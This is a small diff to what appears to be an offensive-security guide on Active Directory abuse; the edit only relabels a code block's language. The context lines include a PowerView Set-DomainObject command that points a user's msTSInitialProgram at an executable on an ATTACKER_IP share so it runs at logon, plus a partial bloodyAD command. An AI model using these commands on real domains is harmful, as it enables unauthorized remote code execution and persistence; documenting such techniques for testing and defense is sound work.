@@ -31,7 +31,7 @@ bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set object vulne
 
 This can be achieved with [Set-DomainObject](https://powersploit.readthedocs.io/en/latest/Recon/Set-DomainObject/) ([PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1) module).
 
-```bash
+```powershell
 
 Set-DomainObject testuser -Set @{'msTSInitialProgram'='\\ATTACKER_IP\share\run_at_logon.exe'} -Verbose
 
